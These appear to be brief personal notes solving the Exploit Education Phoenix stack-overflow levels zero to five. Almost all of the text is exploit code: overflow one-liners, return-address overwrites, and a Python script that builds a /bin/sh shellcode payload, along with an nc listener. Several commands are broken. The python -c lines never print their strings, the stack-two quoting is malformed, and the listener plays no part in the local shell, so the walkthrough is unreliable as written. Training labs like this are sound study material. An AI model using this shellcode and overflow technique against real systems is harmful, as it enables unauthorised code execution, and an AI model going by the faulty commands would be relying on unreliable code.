# stack zero
`python -c "'a' * 65" | ./stack-zero`

# stack one
`./stack-one $(python -c "('a' * 64) + 'bYlI'")`

# stack two
`export ExploitEducation=$(printf 'a%.0s {1..64})$'\n\t\n\r' && ./stack-two`

# stack three
`python -c "'a' * 64 + '\xa1\x06\x40'" | ./stack-three`

# stack four
`python -c "'a' * 88 + '\x21\x06\x40'" | ./stack-four`

generate payload:
```
#!/usr/bin/env python

# Total bytes until return address: 136
total = 136

shellcode =  ""
shellcode += "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
shellcode += "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
shellcode += "\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

# This return address goes to 'jmp eax'
ret = "\x81\x04\x40"

payload = ""
payload += shellcode
payload += "A" * (total - len(payload))
payload += ret

with open("payload", "wb") as f:
        f.write(payload)
```
gen payload:
`python gen_payload.py`

open a nc terminal:
`nc -nvlp 4444`

send payload from another terminal to stack five:
`cat payload | /opt/phoenix/amd64/stack-five`

type `id` and should return your user id
